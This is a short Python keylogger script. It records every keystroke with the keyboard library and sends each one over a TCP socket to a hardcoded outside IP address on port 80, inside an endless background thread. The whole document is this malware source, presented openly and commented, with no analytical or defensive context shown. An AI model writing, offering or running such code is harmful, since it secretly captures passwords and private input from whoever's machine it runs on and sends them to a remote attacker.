import keyboard
import socket
import threading

# The IP address where we will send the logged keys
IP = "123.45.67.100"

def keylog():
    while True:
        # Record the current keystroke
        key = keyboard.read_key()
        
        # Send the keystroke to the specified IP address
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, 80))
        sock.send(key.encode())
        sock.close()

# Start the keylogging thread
threading.Thread(target=keylog).start()
